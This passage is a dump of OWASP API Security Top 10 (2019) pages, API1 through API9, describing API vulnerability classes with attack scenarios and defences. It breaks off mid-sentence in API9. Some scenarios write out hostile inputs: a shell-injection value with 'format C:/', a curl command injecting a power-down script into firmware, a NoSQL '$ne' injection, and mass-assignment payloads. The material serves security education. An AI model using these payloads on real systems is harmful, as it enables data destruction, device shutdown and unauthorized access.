{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **3** : Detectability **2** | Technical **3** : Business Specific |\n| Attackers can exploit API endpoints that are vulnerable to broken object level authorization by manipulating the ID of an object that is sent within the request. This may lead to unauthorized access to sensitive data. This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access. | This has been the most common and impactful attack on APIs. Authorization and access control mechanisms in modern applications are complex and wide-spread. Even if the application implements a proper infrastructure for authorization checks, developers might forget to use these checks before accessing a sensitive object. Access control detection is not typically amenable to automated static or dynamic testing. | Unauthorized access can result in data disclosure to unauthorized parties, data loss, or data manipulation. Unauthorized access to objects can also lead to full account takeover. |\n\n## Is the API Vulnerable?\n\nObject level authorization is an access control mechanism that is usually\nimplemented at the code level to validate that one user can only access objects\nthat they should have access to.\n\nEvery API endpoint that receives an ID of an object, and performs any type of\naction on the object, should implement object level authorization checks. The\nchecks should validate that the logged-in user does have access to perform the\nrequested action on the requested object.\n\nFailures in this mechanism typically leads to unauthorized information\ndisclosure, modification, or destruction of all data.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn e-commerce platform for online stores (shops) provides a listing page with\nthe revenue charts for their hosted shops. Inspecting the browser requests, an\nattacker can identify the API endpoints used as a data source for those charts\nand their pattern `/shops/{shopName}/revenue_data.json`. Using another API\nendpoint, the attacker can get the list of all hosted shop names. With a simple\nscript to manipulate the names in the list, replacing `{shopName}` in the URL,\nthe attacker gains access to the sales data of thousands of e-commerce stores.\n\n### Scenario #2\n\nWhile monitoring the network traffic of a wearable device, the following HTTP\n`PATCH` request gets the attention of an attacker due to the presence of a\ncustom HTTP request header `X-User-Id: 54796`. Replacing the `X-User-Id` value\nwith `54795`, the attacker receives a successful HTTP response, and is able to\nmodify other users' account data.\n\n## How To Prevent\n\n* Implement a proper authorization mechanism that relies on the user policies\n  and hierarchy.\n* Use an authorization mechanism to check if the logged-in user has access to\n  perform the requested action on the record in every function that uses an\n  input from the client to access a record in the database.\n* Prefer to use random and unpredictable values as GUIDs for records’ IDs.\n* Write tests to evaluate the authorization mechanism. Do not deploy vulnerable\n  changes that break the tests.\n\n## References\n\n### External\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:26.311947"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **2** : Detectability **2** | Technical **3** : Business Specific |\n| Authentication in APIs is a complex and confusing mechanism. Software and security engineers might have misconceptions about what are the boundaries of authentication and how to implement it correctly. In addition, the authentication mechanism is an easy target for attackers, since it’s exposed to everyone. These two points makes the authentication component potentially vulnerable to many exploits. | There are two sub-issues: 1. Lack of protection mechanisms: APIs endpoints that are responsible for authentication must be treated differently from regular endpoints and implement extra layers of protection 2. Misimplementation of the mechanism: The mechanism is used / implemented without considering the attack vectors, or it’s the wrong use case (e.g., an authentication mechanism designed for IoT clients might not be the right choice for web applications). | Attackers can gain control to other users’ accounts in the system, read their personal data, and perform sensitive actions on their behalf, like money transactions and sending personal messages. |\n\n## Is the API Vulnerable?\n\nAuthentication endpoints and flows are assets that need to be protected. “Forgot\npassword / reset password” should be treated the same way as authentication\nmechanisms.\n\nAn API is vulnerable if it:\n* Permits [credential stuffing][1] whereby the attacker has a list of valid\n  usernames and passwords.\n* Permits attackers to perform a brute force attack on the same user account, without\n  presenting captcha/account lockout mechanism.\n* Permits weak passwords.\n* Sends sensitive authentication details, such as auth tokens and passwords in\n  the URL.\n* Doesn’t validate the authenticity of tokens.\n* Accepts unsigned/weakly signed JWT tokens (`\"alg\":\"none\"`)/doesn’t\n  validate their expiration date.\n* Uses plain text, non-encrypted, or weakly hashed passwords.\n* Uses weak encryption keys.\n\n## Example Attack Scenarios\n\n## Scenario #1\n\n[Credential stuffing][1] (using [lists of known usernames/passwords][2]), is a\ncommon attack. If an application does not implement automated threat or\ncredential stuffing protections, the application can be used as a password\noracle (tester) to determine if the credentials are valid.\n\n## Scenario #2\n\nAn attacker starts the password recovery workflow by issuing a POST request to\n`/api/system/verification-codes` and by providing the username in the request\nbody. Next an SMS token with 6 digits is sent to the victim’s phone. Because the\nAPI does not implement a rate limiting policy, the attacker can test all\npossible combinations using a multi-threaded script, against the\n`/api/system/verification-codes/{smsToken}` endpoint to discover the right token\nwithin a few minutes.\n\n## How To Prevent\n\n* Make sure you know all the possible flows to authenticate to the API (mobile/\n  web/deep links that implement one-click authentication/etc.)\n* Ask your engineers what flows you missed.\n* Read about your authentication mechanisms. Make sure you understand what and\n  how they are used. OAuth is not authentication, and neither is API keys.\n* Don't reinvent the wheel in authentication, token generation, password\n  storage. Use the standards.\n* Credential recovery/forget password endpoints should be treated as login\n  endpoints in terms of brute force, rate limiting, and lockout protections.\n* Use the [OWASP Authentication Cheatsheet][3].\n* Where possible, implement multi-factor authentication.\n* Implement anti brute force mechanisms to mitigate credential stuffing,\n  dictionary attack, and brute force attacks on your authentication endpoints.\n  This mechanism should be stricter than the regular rate limiting mechanism on\n  your API.\n* Implement [account lockout][4] / captcha mechanism to prevent brute force\n  against specific users. Implement weak-password checks.\n* API keys should not be used for user authentication, but for [client app/\n  project authentication][5].\n\n## References\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### External\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:26.540595"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **2** : Detectability **2** | Technical **2** : Business Specific |\n| Exploitation of Excessive Data Exposure is simple, and is usually performed by sniffing the traffic to analyze the API responses, looking for sensitive data exposure that should not be returned to the user. | APIs rely on clients to perform the data filtering. Since APIs are used as data sources, sometimes developers try to implement them in a generic way without thinking about the sensitivity of the exposed data. Automatic tools usually can’t detect this type of vulnerability because it’s hard to differentiate between legitimate data returned from the API, and sensitive data that should not be returned without a deep understanding of the application. | Excessive Data Exposure commonly leads to exposure of sensitive data. |\n\n## Is the API Vulnerable?\n\nThe API returns sensitive data to the client by design. This data is usually\nfiltered on the client side before being presented to the user. An attacker can\neasily sniff the traffic and see the sensitive data.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nThe mobile team uses the `/api/articles/{articleId}/comments/{commentId}`\nendpoint in the articles view to render comments metadata. Sniffing the mobile\napplication traffic, an attacker finds out that other sensitive data related to\ncomment’s author is also returned. The endpoint implementation uses a generic\n`toJSON()` method on the `User` model, which contains PII, to serialize the\nobject.\n\n### Scenario #2\n\nAn IOT-based surveillance system allows administrators to create users with\ndifferent permissions. An admin created a user account for a new security guard\nthat should only have access to specific buildings on the site. Once the\nsecurity guard uses his mobile app, an API call is triggered to:\n`/api/sites/111/cameras` in order to receive data about the available cameras\nand show them on the dashboard. The response contains a list with details about\ncameras in the following format:\n`{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`.\nWhile the client GUI shows only cameras which the security guard should have\naccess to, the actual API response contains a full list of all the cameras in\nthe site.\n\n## How To Prevent\n\n* Never rely on the client side to filter sensitive data.\n* Review the responses from the API to make sure they contain only legitimate\n  data.\n* Backend engineers should always ask themselves \"who is the\n  consumer of the data?\" before exposing a new API endpoint.\n* Avoid using generic methods such as `to_json()` and `to_string()`.\n  Instead, cherry-pick specific properties you really want to return\n* Classify sensitive and personally identifiable information (PII) that\n  your application stores and works with, reviewing all API calls returning such\n  information to see if these responses pose a security issue.\n* Implement a schema-based response validation mechanism as an extra layer of\n  security. As part of this mechanism define and enforce data returned by all\n  API methods, including errors.\n\n\n## References\n\n### External\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:26.655535"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **2** | Prevalence **3** : Detectability **3** | Technical **2** : Business Specific |\n| Exploitation requires simple API requests. No authentication is required. Multiple concurrent requests can be performed from a single local computer or by using cloud computing resources. | It’s common to find APIs that do not implement rate limiting or APIs where limits are not properly set. | Exploitation may lead to DoS, making the API unresponsive or even unavailable. |\n\n## Is the API Vulnerable?\n\nAPI requests consume resources such as network, CPU, memory, and storage. The\namount of resources required to satisfy a request greatly depends on the user\ninput and endpoint business logic. Also, consider the fact that requests from\nmultiple API clients compete for resources. An API is vulnerable if at least one\nof the following limits is missing or set inappropriately (e.g., too low/high):\n\n* Execution timeouts\n* Max allocable memory\n* Number of file descriptors\n* Number of processes\n* Request payload size (e.g., uploads)\n* Number of requests per client/resource\n* Number of records per page to return in a single request response\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn attacker uploads a large image by issuing a POST request to `/api/v1/images`.\nWhen the upload is complete, the API creates multiple thumbnails with different\nsizes. Due to the size of the uploaded image, available memory is exhausted\nduring the creation of thumbnails and the API becomes unresponsive.\n\n### Scenario #2\n\nWe have an application that contains the users' list on a UI with a limit of\n`200` users per page. The users' list is retrieved from the server using the\nfollowing query: `/api/users?page=1&size=200`. An attacker changes the `size`\nparameter to `200 000`, causing performance issues on the database. Meanwhile,\nthe API becomes unresponsive and is unable to handle further requests from this\nor any other clients (aka DoS).\n\nThe same scenario might be used to provoke Integer Overflow or Buffer Overflow\nerrors.\n\n## How To Prevent\n\n* Docker makes it easy to limit [memory][1], [CPU][2], [number of restarts][3],\n  [file descriptors, and processes][4].\n* Implement a limit on how often a client can call the API within a defined\n  timeframe.\n* Notify the client when the limit is exceeded by providing the limit number and\n  the time at which the limit will be reset.\n* Add proper server-side validation for query string and request body\n  parameters, specifically the one that controls the number of records to be\n  returned in the response.\n* Define and enforce maximum size of data on all incoming parameters and\n  payloads such as maximum length for strings and maximum number of elements in\n  arrays.\n\n\n## References\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### External\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:26.761837"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **2** : Detectability **1** | Technical **2** : Business Specific |\n| Exploitation requires the attacker to send legitimate API calls to the API endpoint that they should not have access to. These endpoints might be exposed to anonymous users or regular, non-privileged users. It’s easier to discover these flaws in APIs since APIs are more structured, and the way to access certain functions is more predictable (e.g., replacing the HTTP method from GET to PUT, or changing the “users” string in the URL to \"admins\"). | Authorization checks for a function or resource are usually managed via configuration, and sometimes at the code level. Implementing proper checks can be a confusing task, since modern applications can contain many types of roles or groups and complex user hierarchy (e.g., sub-users, users with more than one role). | Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack. |\n\n## Is the API Vulnerable?\n\nThe best way to find broken function level authorization issues is to perform\ndeep analysis of the authorization mechanism, while keeping in mind the user\nhierarchy, different roles or groups in the application, and asking the\nfollowing questions:\n\n* Can a regular user access administrative endpoints?\n* Can a user perform sensitive actions (e.g., creation, modification, or\n  erasure) that they should not have access to by simply changing the HTTP\n  method (e.g., from `GET` to `DELETE`)?\n* Can a user from group X access a function that should be exposed only to users\n  from group Y, by simply guessing the endpoint URL and parameters (e.g.,\n  `/api/v1/users/export_all`)?\n\nDon’t assume that an API endpoint is regular or administrative only based on the\nURL path.\n\nWhile developers might choose to expose most of the administrative endpoints\nunder a specific relative path, like `api/admins`, it’s very common to find\nthese administrative endpoints under other relative paths together with regular\nendpoints, like `api/users`.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nDuring the registration process to an application that allows only invited users\nto join, the mobile application triggers an API call to\n`GET /api/invites/{invite_guid}`. The response contains a JSON with details\nabout the invite, including the user’s role and the user’s email.\n\nAn attacker duplicated the request and manipulated the HTTP method and endpoint\nto `POST /api/invites/new`. This endpoint should only be accessed by\nadministrators using the admin console, which does not implement function level\nauthorization checks.\n\nThe attacker exploits the issue and sends himself an invite to create an\nadmin account:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Scenario #2\n\nAn API contains an endpoint that should be exposed only to administrators -\n`GET /api/admin/v1/users/all`. This endpoint returns the details of all the\nusers of the application and does not implement function-level authorization\nchecks. An attacker who learned the API structure takes an educated guess and\nmanages to access this endpoint, which exposes sensitive details of the users of\nthe application.\n\n## How To Prevent\n\nYour application should have a consistent and easy to analyze authorization\nmodule that is invoked from all your business functions. Frequently, such\nprotection is provided by one or more components external to the application\ncode.\n\n* The enforcement mechanism(s) should deny all access by default, requiring\n  explicit grants to specific roles for access to every function.\n* Review your API endpoints against function level authorization flaws, while\n  keeping in mind the business logic of the application and groups hierarchy.\n* Make sure that all of your administrative controllers inherit from an\n  administrative abstract controller that implements authorization checks based\n  on the user’s group/role.\n* Make sure that administrative functions inside a regular controller implements\n  authorization checks based on the user’s group and role.\n\n## References\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### External\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:26.879575"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **2** | Prevalence **2** : Detectability **2** | Technical **2** : Business Specific |\n| Exploitation usually requires an understanding of the business logic, objects' relations, and the API structure. Exploitation of mass assignment is easier in APIs, since by design they expose the underlying implementation of the application along with the properties’ names. | Modern frameworks encourage developers to use functions that automatically bind input from the client into code variables and internal objects. Attackers can use this methodology to update or overwrite sensitive object’s properties that the developers never intended to expose. | Exploitation may lead to privilege escalation, data tampering, bypass of security mechanisms, and more. |\n\n## Is the API Vulnerable?\n\nObjects in modern applications might contain many properties. Some of these\nproperties should be updated directly by the client (e.g., `user.first_name` or\n`user.address`) and some of them should not (e.g., `user.is_vip` flag).\n\nAn API endpoint is vulnerable if it automatically converts client parameters\ninto internal object properties, without considering the sensitivity and the\nexposure level of these properties. This could allow an attacker to update\nobject properties that they should not have access to.\n\nExamples for sensitive properties:\n\n* **Permission-related properties**: `user.is_admin`, `user.is_vip` should only\n  be set by admins.\n* **Process-dependent properties**: `user.cash` should only be set internally\n  after payment verification.\n* **Internal properties**: `article.created_time` should only be set internally\n  by the application.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA ride sharing application provides a user the option to edit basic information\nfor their profile. During this process, an API call is sent to\n`PUT /api/v1/users/me` with the following legitimate JSON object:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nThe request `GET /api/v1/users/me` includes an additional credit_balance\nproperty:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nThe attacker replays the first request with the following payload:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nSince the endpoint is vulnerable to mass assignment, the attacker receives\ncredits without paying.\n\n### Scenario #2\n\nA video sharing portal allows users to upload content and download content in\ndifferent formats. An attacker who explores the API found that the endpoint\n`GET /api/v1/videos/{video_id}/meta_data` returns a JSON object with the video’s\nproperties. One of the properties is `\"mp4_conversion_params\":\"-v codec h264\"`,\nwhich indicates that the application uses a shell command to convert the video.\n\nThe attacker also found the endpoint `POST /api/v1/videos/new` is vulnerable to\nmass assignment and allows the client to set any property of the video object.\nThe attacker sets a malicious value as follows:\n`\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. This value will cause a\nshell command injection once the attacker downloads the video as MP4.\n\n## How To Prevent\n\n* If possible, avoid using functions that automatically bind a client’s input\n  into code variables or internal objects.\n* Whitelist only the properties that should be updated by the client.\n* Use built-in features to blacklist properties that should not be accessed by\n  clients.\n* If applicable, explicitly define and enforce schemas for the input data\n  payloads.\n\n## References\n\n### External\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:26.988810"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **3** : Detectability **3** | Technical **2** : Business Specific |\n| Attackers will often attempt to find unpatched flaws, common endpoints, or unprotected files and directories to gain unauthorized access or knowledge of the system. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations can not only expose sensitive user data, but also system details that may lead to full server compromise. |\n\n## Is the API Vulnerable?\n\nThe API might be vulnerable if:\n\n* Appropriate security hardening is missing across any part of the application\n  stack, or if it has improperly configured permissions on cloud services.\n* The latest security patches are missing, or the systems are out of date.\n* Unnecessary features are enabled (e.g., HTTP verbs).\n* Transport Layer Security (TLS) is missing.\n* Security directives are not sent to clients (e.g., [Security Headers][1]).\n* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set.\n* Error messages include stack traces, or other sensitive information is\n  exposed.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn attacker finds the `.bash_history` file under the root directory of the\nserver, which contains commands used by the DevOps team to access the API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nAn attacker could also find new endpoints on the API that are used only by the\nDevOps team and are not documented.\n\n### Scenario #2\n\nTo target a specific service, an attacker uses a popular search engine to search\nfor  computers directly accessible from the Internet. The attacker found a host\nrunning a popular database management system, listening on the default port. The\nhost was using the default configuration, which has authentication disabled by\ndefault, and the attacker gained access to millions of records with PII,\npersonal preferences, and authentication data.\n\n### Scenario #3\n\nInspecting traffic of a mobile application an attacker finds out that not all\nHTTP traffic is performed on a secure protocol (e.g., TLS). The attacker finds\nthis to be true, specifically for the download of profile images. As user\ninteraction is binary, despite the fact that API traffic is performed on a\nsecure protocol, the attacker finds a pattern on API responses size, which he\nuses to track user preferences over the rendered content (e.g., profile images).\n\n## How To Prevent\n\nThe API life cycle should include:\n\n* A repeatable hardening process leading to fast and easy deployment of a\n  properly locked down environment.\n* A task to review and update configurations across the entire API stack. The\n  review should include: orchestration files, API components, and cloud services\n  (e.g., S3 bucket permissions).\n* A secure communication channel for all API interactions access to static\n  assets (e.g., images).\n* An automated process to continuously assess the effectiveness of the\n  configuration and settings in all environments.\n\nFurthermore:\n\n* To prevent exception traces and other valuable information from being sent\n  back to attackers, if applicable, define and enforce all API response payload\n  schemas including error responses.\n* Ensure API can only be accessed by the specified HTTP verbs. All other HTTP\n  verbs should be disabled (e.g. `HEAD`).\n* APIs expecting to be accessed from browser-based clients (e.g., WebApp\n  front-end) should implement a proper Cross-Origin Resource Sharing (CORS)\n  policy.\n\n## References\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### External\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:27.142228"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **2** : Detectability **3** | Technical **3** : Business Specific |\n| Attackers will feed the API with malicious data through whatever injection vectors are available (e.g., direct input, parameters, integrated services, etc.), expecting it to be sent to an interpreter. | Injection flaws are very common and are often found in SQL, LDAP, or NoSQL queries, OS commands, XML parsers, and ORM. These flaws are easy to discover when reviewing the source code. Attackers can use scanners and fuzzers. | Injection can lead to information disclosure and data loss. It may also lead to DoS, or complete host takeover. |\n\n## Is the API Vulnerable?\n\nThe API is vulnerable to injection flaws if:\n\n* Client-supplied data is not validated, filtered, or sanitized by the API.\n* Client-supplied data is directly used or concatenated to SQL/NoSQL/LDAP\n  queries, OS commands, XML parsers, and Object Relational Mapping (ORM)/Object\n  Document Mapper (ODM).\n* Data coming from external systems (e.g., integrated systems) is not validated,\n  filtered, or sanitized by the API.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nFirmware of a parental control device provides the endpoint\n`/api/CONFIG/restore` which expects an appId to be sent as a multipart\nparameter. Using a decompiler, an attacker finds out that the appId is passed\ndirectly into a system call without any sanitization:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nThe following command allows the attacker to shut down any device with the same\nvulnerable firmware:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Scenario #2\n\nWe have an application with basic CRUD functionality for operations with\nbookings. An attacker managed to identify that NoSQL injection might be possible\nthrough `bookingId` query string parameter in the delete booking request. This\nis how the request looks like: `DELETE /api/bookings?bookingId=678`.\n\nThe API server uses the following function to handle delete requests:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nThe attacker intercepted the request and changed `bookingId` query string\nparameter as shown below. In this case, the attacker managed to delete another\nuser's booking:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## How To Prevent\n\nPreventing injection requires keeping data separate from commands and queries.\n\n* Perform data validation using a single, trustworthy, and actively maintained\n  library.\n* Validate, filter, and sanitize all client-provided data, or other data coming\n  from integrated systems.\n* Special characters should be escaped using the specific syntax for the target\n  interpreter.\n* Prefer a safe API that provides a parameterized interface.\n* Always limit the number of returned records to prevent mass disclosure in case\n  of injection.\n* Validate incoming data using sufficient filters to only allow valid values for\n  each input parameter.\n* Define data types and strict patterns for all string parameters.\n\n## References\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### External\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:27.246237"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **3** | Prevalence **3** : Detectability **2** | Technical **2** : Business Specific |\n| Old API versions are usually unpatched and are an easy way to compromise systems without having to fight state-of-the-art security mechanisms, which might be in place to protect the most recent API versions. | Outdated documentation makes it more difficult to find and/or fix vulnerabilities. Lack of assets inventory and retire strategies leads to running unpatched systems, resulting in leakage of sensitive data. It’s common to find unnecessarily exposed API hosts because of modern concepts like microservices, which make applications easy to deploy and independent (e.g., cloud computing, k8s). | Attackers may gain access to sensitive data, or even takeover the server through old, unpatched API versions connected to the same database. |\n\n## Is the API Vulnerable?\n\nThe API might be vulnerable if:\n\n* The purpose of an API host is unclear, and there are no explicit answers to\n  the following questions:\n    * Which environment is the API running in (e.g., production, staging, test,\n      development)?\n    * Who should have network access to the API (e.g., public, internal,\n      partners)?\n    * Which API version is running?\n    * What data is gathered and processed by the API (e.g., PII)?\n    * What's the data flow?\n* There is no documentation, or the existing documentation is not updated.\n* There is no retirement plan for each API version.\n* Hosts inventory is missing or outdated.\n* Integrated services inventory, either first- or third-party, is missing or\n  outdated.\n* Old or previous API versions are running unpatched.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAfter redesigning their applications, a local search service left an old API\nversion (`api.someservice.com/v1`) running, unprotected, and with access to the\nuser database. While targeting one of the latest released applications, an\nattacker found the API address (`api.someservice.com/v2`). Replacing `v2` with\n`v1` in the URL gave the attacker access to the old, unprotected API,\nexposing the personal identifiable information (PII) of over 100 Million users.\n\n### Scenario #2\n\nA social network implemented a rate-limiting mechanism that blocks attackers\nfrom using brute-force to guess reset password tokens. This mechanism wasn’t\nimplemented as part of the API code itself, but in a separate component between\nthe client and the official API (`www.socialnetwork.com`).\nA researcher found a beta API host (`www.mbasic.beta.socialnetwork.com`) that\nruns the same API, including the reset password mechanism, but the rate limiting\nmechanism was not in place. The researcher was able to reset the password of any\nuser by using a simple brute-force to guess the 